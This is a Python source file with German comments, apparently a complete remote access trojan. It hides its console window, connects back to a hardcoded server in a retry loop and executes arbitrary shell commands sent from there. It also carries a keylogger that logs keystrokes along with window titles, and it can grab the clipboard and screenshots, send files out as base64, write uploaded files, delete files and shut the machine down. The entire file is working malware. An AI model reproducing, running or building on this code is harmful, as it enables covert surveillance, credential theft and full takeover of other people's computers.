import socket
import time
import pyperclip
import platform
import socket as sock_mod
from datetime import datetime
import os
import subprocess
import tempfile
import sys
import base64
import threading
import tkinter as tk
from tkinter import messagebox
from pynput import keyboard

# Hide console window on Windows
if platform.system() == "Windows":
    import ctypes
    # Hide console window
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# Try to import optional dependencies
try:
    import pyautogui
except ImportError:
    pyautogui = None
    print("[!] pyautogui nicht installiert. Einige Funktionen werden nicht verfügbar sein.")

try:
    from win32gui import GetWindowText, GetForegroundWindow
except ImportError:
    GetWindowText = GetForegroundWindow = None
    print("[!] win32gui nicht installiert. Fenstertitel werden nicht erfasst.")

try:
    from PIL import ImageGrab
except ImportError:
    ImageGrab = None
    print("[!] PIL nicht installiert. Screenshots werden nicht verfügbar sein.")

# Server-Konfiguration
HOST_IP = "192.168.178.76"
PORT = 8080

class Keylogger:
    def __init__(self):
        self.is_logging = False
        self.log_file = None
        self.listener = None

    def start_logging(self):
        if self.is_logging:
            return
        self.is_logging = True
        self.log_file = open("keylog.txt", "a", encoding="utf-8")
        self.log_file.write(f"\n=== Keylogger gestartet: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
        self.listener = keyboard.Listener(on_press=self.on_key_press)
        self.listener.daemon = True
        self.listener.start()

    def stop_logging(self):
        if self.listener:
            self.listener.stop()
            self.listener = None
        if self.log_file:
            self.log_file.write(f"=== Keylogger gestoppt: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n\n")
            self.log_file.close()
            self.log_file = None
        self.is_logging = False

    def on_key_press(self, key):
        if self.is_logging and self.log_file:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            # Aktives Fenster ermitteln
            window = "Unbekannt"
            if GetWindowText and GetForegroundWindow:
                try:
                    window = GetWindowText(GetForegroundWindow())
                except:
                    pass
            # Taste als lesbarer String
            if hasattr(key, 'char') and key.char is not None:
                key_str = key.char
            else:
                key_str = str(key).replace('Key.', '').upper()
            # Logformat: Zeit | Fenster | Taste
            log_line = f"[{timestamp}] | [{window}] | {key_str}\n"
            self.log_file.write(log_line)
            self.log_file.flush()

# Benutzerdefinierte Befehle und ihre Beschreibungen
COMMANDS = {
    "System": {
        "os": "Betriebssystemname und Version",
        "hostname": "Rechnername",
        "whoami": "Aktuell angemeldeter Benutzer",
        "users": "Alle eingeloggten Benutzer",
        "env": "Umgebungsvariablen anzeigen",
        "cpu": "CPU-Informationen",
        "memory": "RAM-Auslastung",
        "disk": "Festplattenplatz",
        "uptime": "Systemlaufzeit",
        "ipconfig": "Netzwerk-Konfiguration",
        "netstat": "Offene Netzwerkverbindungen",
        "lsusb": "USB-Geräte (Linux/Mac)",
        "lspci": "PCI-Geräte (Linux)",
        "wmic": "Windows Management Instrumentation (Windows)"
    },
    "Dateisystem": {
        "cwd": "Aktuelles Arbeitsverzeichnis",
        "listdir <pfad>": "Dateien/Ordner auflisten",
        "tree <pfad>": "Verzeichnisbaum anzeigen",
        "mkdir <pfad>": "Verzeichnis erstellen",
        "rmdir <pfad>": "Verzeichnis löschen",
        "delete <pfad>": "Datei löschen",
        "download <pfad>": "Datei als Base64 senden",
        "upload <pfad> <base64>": "Datei aus Base64 speichern"
    },
    "Prozesse & Benutzer": {
        "processes": "Laufende Prozesse anzeigen",
        "kill <pid>": "Prozess beenden",
        "start <befehl>": "Prozess starten"
    },
    "Netzwerk": {
        "ping <host>": "Host anpingen",
        "traceroute <host>": "Route zu Host anzeigen",
        "ifconfig": "Netzwerkschnittstellen (Linux/Mac)",
        "route": "Routing-Tabelle anzeigen"
    },
    "Systemsteuerung": {
        "shutdown": "Rechner herunterfahren",
        "reboot": "Rechner neu starten",
        "logoff": "Benutzer abmelden",
        "lock": "Bildschirm sperren (Windows)"
    },
    "Clipboard & Screenshot": {
        "clipboard": "Inhalt der Zwischenablage anzeigen",
        "screenshot": "Screenshot als Base64 senden"
    },
    "Text/Utility": {
        "echo <text>": "Text zurückgeben",
        "reverse <text>": "Text rückwärts ausgeben",
        "help": "Hilfe anzeigen"
    },
    "Keylogger": {
        "keylogger": "Keylogger-Funktionen"
    }
}

def execute_system_command(command):
    try:
        # Führe den Systembefehl aus
        # stderr wird auch erfasst
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            
        output, error = process.communicate()
        combined_output = output + error

        if not combined_output:
            return "Befehl ausgeführt, keine Ausgabe.\n"
            
        # Stellt sicher, dass die Ausgabe in String umgewandelt wird
        return combined_output.decode(errors='ignore')
        
    except Exception as e:
        return f"Fehler beim Ausführen des Systembefehls: {str(e)}\n"

def process_custom_command(command):
    cmd_parts = command.split(maxsplit=1)
    base_cmd = cmd_parts[0].lower()
    args = cmd_parts[1] if len(cmd_parts) > 1 else ""

    if base_cmd == "help":
        result = "\nVerfügbare Befehle:\n--------------------\n"
        # Finde die maximale Länge des Befehlsnamens für die Formatierung
        max_cmd_len = max(len(cmd) for cmd in COMMANDS) if COMMANDS else 0
        for cmd, desc in COMMANDS.items():
            result += f"{cmd:<{max_cmd_len}} - {desc}\n"
        return result.strip()

    elif base_cmd == "time":
        return time.ctime()

    elif base_cmd == "date":
        return datetime.now().strftime("%Y-%m-%d")

    elif base_cmd == "hostname":
        return platform.node()

    elif base_cmd == "os":
        return platform.system() + " " + platform.release()

    elif base_cmd == "whoami":
        try:
            user = os.getlogin()
            return user
        except Exception:
            # Fallback für Umgebungen, wo os.getlogin() fehlschlägt
            return os.environ.get("USERNAME") or os.environ.get("USER") or "Unbekannt"

    elif base_cmd == "clipboard":
        try:
            clip = pyperclip.paste()
            if clip:
                return clip
            else:
                return "[Zwischenablage ist leer]"
        except Exception as e:
            return f"[Fehler beim Lesen der Zwischenablage: {e}]"

    elif base_cmd == "cwd":
        return os.getcwd()

    elif base_cmd == "listdir":
        path = args if args else "."
        if not os.path.isdir(path):
            return "[Verzeichnis nicht gefunden]"
        try:
            files = os.listdir(path)
            return "\n".join(files[:50]) + ("\n... (gekürzt)" if len(files) > 50 else "")
        except Exception as e:
            return f"[Fehler bei listdir: {e}]"

    elif base_cmd == "mkdir":
        path = args.strip()
        if not path:
            return "[Fehler: Verzeichnisname fehlt]"
        try:
            os.makedirs(path, exist_ok=True)
            return f"[Verzeichnis '{path}' erstellt]"
        except Exception as e:
            return f"[Fehler bei mkdir: {e}]"

    elif base_cmd == "rmdir":
        path = args.strip()
        if not path:
            return "[Fehler: Verzeichnisname fehlt]"
        try:
            os.rmdir(path) # rmdir löscht nur leere Verzeichnisse
            return f"[Verzeichnis '{path}' gelöscht (muss leer sein)]"
        except OSError as e:
             if e.errno == 39: # Directory not empty
                 return f"[Fehler: Verzeichnis '{path}' ist nicht leer]"
             return f"[Fehler bei rmdir: {e}]"
        except Exception as e:
            return f"[Fehler bei rmdir: {e}]"
            
    elif base_cmd == "delete":
        path = args.strip()
        if not path:
            return "[Fehler: Dateiname fehlt]"
        try:
            if os.path.isfile(path):
                os.remove(path)
                return f"[Datei '{path}' gelöscht]"
            else:
                return "[Datei nicht gefunden]"
        except Exception as e:
            return f"[Fehler bei delete: {e}]"
            
    elif base_cmd == "ping":
        # Nutzt die execute_system_command Funktion
        if not args:
             return "[Fehler: Hostname oder IP fehlt für ping]"
        param = "-n" if platform.system() == "Windows" else "-c"
        return execute_system_command(f"ping {param} 3 {args}")

    elif base_cmd == "uptime":
         # Nutzt die execute_system_command Funktion
         if platform.system() == "Windows":
             # Windows Alternative, z.B. systeminfo | findstr "Zeit des Systemstarts"
             return execute_system_command("systeminfo | findstr \"Zeit des Systemstarts\"")
         else:
             return execute_system_command("uptime")

    elif base_cmd == "disk":
        if platform.system() == "Windows":
            # PowerShell-Alternative für Festplatteninfos
            return execute_system_command('powershell "Get-PSDrive -PSProvider FileSystem | Select-Object Name,Free,Used, @{Name=\'Total\';Expression={($_.Free + $_.Used)}} | Format-Table -AutoSize"')
        else:
            return execute_system_command("df -h")

    elif base_cmd == "env":
        # Nutzt die execute_system_command Funktion
        if platform.system() == "Windows":
             return execute_system_command("set") # Windows equivalent
        else:
             return execute_system_command("env")

    elif base_cmd == "cpu":
        if platform.system() == "Windows":
            # PowerShell-Alternative für CPU-Infos
            return execute_system_command('powershell "Get-CimInstance Win32_Processor | Select-Object Name,NumberOfCores,NumberOfLogicalProcessors | Format-Table -AutoSize"')
        else:
            return execute_system_command("lscpu")

    elif base_cmd == "memory":
        if platform.system() == "Windows":
            # PowerShell-Alternative für RAM-Infos
            return execute_system_command('powershell "Get-CimInstance Win32_OperatingSystem | Select-Object FreePhysicalMemory,TotalVisibleMemorySize"')
        else:
            return execute_system_command("free -h")

    elif base_cmd == "echo":
        return args

    elif base_cmd == "reverse":
        return args[::-1]

    elif base_cmd == "screenshot":
        if ImageGrab is None:
            return "[PIL nicht installiert, kein Screenshot möglich]"
        try:
            import io
            img = ImageGrab.grab()
            buf = io.BytesIO()
            img.save(buf, format="PNG")
            img_bytes = buf.getvalue()
            b64_img = base64.b64encode(img_bytes).decode()
            return f"[Screenshot Base64 PNG]:\n{b64_img}"
        except Exception as e:
            return f"[Fehler beim Screenshot: {e}]"

    elif base_cmd == "exit":
        return "EXIT"

    elif base_cmd == "lsusb":
        if platform.system() == "Windows":
            return "[lsusb nicht verfügbar unter Windows]"
        else:
            return execute_system_command("lsusb")

    elif base_cmd == "netstat":
        if platform.system() == "Windows":
            return execute_system_command("netstat -ano")
        else:
            return execute_system_command("netstat -tunap")

    elif base_cmd == "users":
        if platform.system() == "Windows":
            return execute_system_command("query user")
        else:
            return execute_system_command("who")

    elif base_cmd == "processes":
        if platform.system() == "Windows":
            return execute_system_command("tasklist")
        else:
            return execute_system_command("ps aux")

    elif base_cmd == "shutdown":
        if platform.system() == "Windows":
            return execute_system_command("shutdown /s /t 0")
        else:
            return execute_system_command("shutdown now")

    elif base_cmd == "reboot":
        if platform.system() == "Windows":
            return execute_system_command("shutdown /r /t 0")
        else:
            return execute_system_command("reboot")

    elif base_cmd == "ipconfig":
        if platform.system() == "Windows":
            return execute_system_command("ipconfig /all")
        else:
            return execute_system_command("ifconfig")

    elif base_cmd == "tree":
        path = args if args else "."
        if platform.system() == "Windows":
            return execute_system_command(f"tree {path}")
        else:
            return execute_system_command(f"tree -L 2 {path}")

    elif base_cmd == "download":
        path = args.strip()
        if not os.path.isfile(path):
            return "[Datei nicht gefunden]"
        try:
            with open(path, "rb") as f:
                b64 = base64.b64encode(f.read()).decode()
            return f"[Download Base64]:\n{b64}"
        except Exception as e:
            return f"[Fehler beim Download: {e}]"

    elif base_cmd == "upload":
        try:
            path, b64 = args.split(" ", 1)
            with open(path, "wb") as f:
                f.write(base64.b64decode(b64.encode()))
            return f"[Datei '{path}' hochgeladen]"
        except Exception as e:
            return f"[Fehler beim Upload: {e}]"

    elif base_cmd == "keylogger":
        if args == "start":
            if not hasattr(process_custom_command, 'keylogger'):
                process_custom_command.keylogger = Keylogger()
            process_custom_command.keylogger.start_logging()
            return "[Keylogger gestartet, Logfile: keylog.txt]"
        elif args == "stop":
            if hasattr(process_custom_command, 'keylogger'):
                process_custom_command.keylogger.stop_logging()
                return "[Keylogger gestoppt]"
        elif args == "status":
            if hasattr(process_custom_command, 'keylogger'):
                status = "aktiv" if process_custom_command.keylogger.is_logging else "inaktiv"
                return f"[Keylogger Status: {status}]"
        return "[Keylogger Befehle: start, stop, status]"

    return None # Befehl nicht gefunden

def main():
    while True:
        try:
            # Verbinde mit dem Server
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            print(f"[*] Verbinde mit {HOST_IP}:{PORT}...")
            s.connect((HOST_IP, PORT))
            print("[*] Verbunden!")
            
            # Sende System-Info
            system_info = f"""
System Information:
------------------
OS: {platform.system()} {platform.release()}
Hostname: {platform.node()}
User: {os.getlogin()}
Current Directory: {os.getcwd()}
"""
            s.send(system_info.encode())
            
            while True:
                # Empfange Befehl vom Netcat Listener
                command = s.recv(4096).decode().strip()
                
                if not command:
                    break
                    
                # Versuche zuerst, einen benutzerdefinierten Befehl zu verarbeiten
                output = process_custom_command(command)
                
                # Wenn es kein benutzerdefinierter Befehl war, führe ihn als Systembefehl aus
                if output is None:
                    output = execute_system_command(command)

                # Sende Ergebnis zurück
                if not isinstance(output, str):
                    output = str(output)
                    
                s.send(output.encode(errors='ignore') + b'\n')
                
                if output.strip() == "EXIT":
                    break
                    
        except Exception as e:
            print(f"[-] Fehler: {e}")
            time.sleep(5)
            continue
        finally:
            s.close()
            
        print("[*] Verbindung getrennt. Versuche erneut zu verbinden...")
        time.sleep(5)

if __name__ == "__main__":
    main()
